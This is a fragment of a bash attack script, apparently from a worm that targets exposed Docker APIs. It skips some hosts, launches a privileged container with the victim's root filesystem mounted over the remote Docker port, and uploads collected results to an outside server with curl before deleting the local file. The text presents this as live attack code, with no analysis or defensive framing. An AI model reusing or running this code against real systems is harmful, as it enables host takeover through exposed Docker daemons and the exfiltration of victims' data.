...
if [ "$RAM" = "31.42GiB" ]; then DONTINF="yes" ; echo -e "\e[1;33;41m Ein friend FU!!! \033[0m"; fi
if [ "$ARCHITEC" != "x86_64" ] ; then DONTINF="yes" ; echo -e "\e[1;33;41m Not Our Platform!!! \033[0m"; fi
if [ "$DONTINF" = "no" ]; then
timeout -s SIGKILL 120 docker -H $IPADDY:$PORT run -d --name smolv2 --privileged --net host -v /:/host $PWNCONTI
HE_SAY=$?
echo $HE_SAY
if [ "$HE_SAY" = "0" ]; then
...
if [ -f "/tmp/out.txt" ] ; then curl -F "userfile=@/tmp/out.txt" http://solscan.live/SFRAME/results/d.php ; rm -f /tmp/out.txt ; fi
